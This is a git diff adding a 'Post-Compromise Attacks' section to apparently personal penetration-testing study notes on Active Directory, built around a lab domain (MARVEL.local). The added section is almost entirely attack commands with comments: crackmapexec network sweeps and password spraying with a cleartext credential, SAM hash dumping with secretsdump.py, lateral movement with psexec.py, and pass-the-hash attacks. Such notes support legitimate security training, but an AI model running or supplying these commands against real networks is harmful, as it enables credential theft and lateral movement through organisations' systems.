@@ -3,6 +3,7 @@
 1. [Introduction](#introduction)
 2. [Attacking Active Directory: Initial Attack Vectors](#attacking-active-directory-initial-attack-vectors)
 3. [Attacking Active Directory: Post-Compromise Enumeration](#attacking-active-directory-post-compromise-enumeration)
+4. [Attacking Active Directory: Post-Compromise Attacks](#attacking-active-directory-post-compromise-attacks)
 
 ## Introduction
 
@@ -254,3 +255,33 @@
   ```
 
   * This zip file can be imported in BloodHound. We can use Pre-Built Analytics Queries to plan further.
+
+## Attacking Active Directory: Post-Compromise Attacks
+
+* Pass the Hash:
+
+  ```shell
+  crackmapexec smb 192.168.57.0/24 -u fcastle -d MARVEL.local -p Password1
+  #sweep entire network
+  #attempts to gain access via pass the password
+  #can also spray passwords
+
+  crackmapexec smb 192.168.57.0/24 -u fcastle -d MARVEL.local -p Password1 --same
+  #attempts to dump SAM files
+
+  psexec.py marvel/fcastle:Password1@192.168.57.142
+  #use creds from crackmapexec to gain access to other machine
+
+  secretsdump.py marvel/fcastle:Password1@192.168.57.141
+  #silent alternative to hashdump in meterpreter
+  #dumps SAM hashes
+
+  #the NTLM hashes can be cracked using Hashcat
+  #if we cannot crack hashes, we can pass the hashes (only NTLM, not NTLMv2)
+
+  crackmapexec smb 192.168.57.0/24 -u "Frank Castle" -H <hash> --local-auth
+  #attempts to pass the hash
+
+  psexec.py "Frank Castle":@192.168.57.141 -hashes <complete NTLM hash>
+  #alt pass the hash method
+  ```
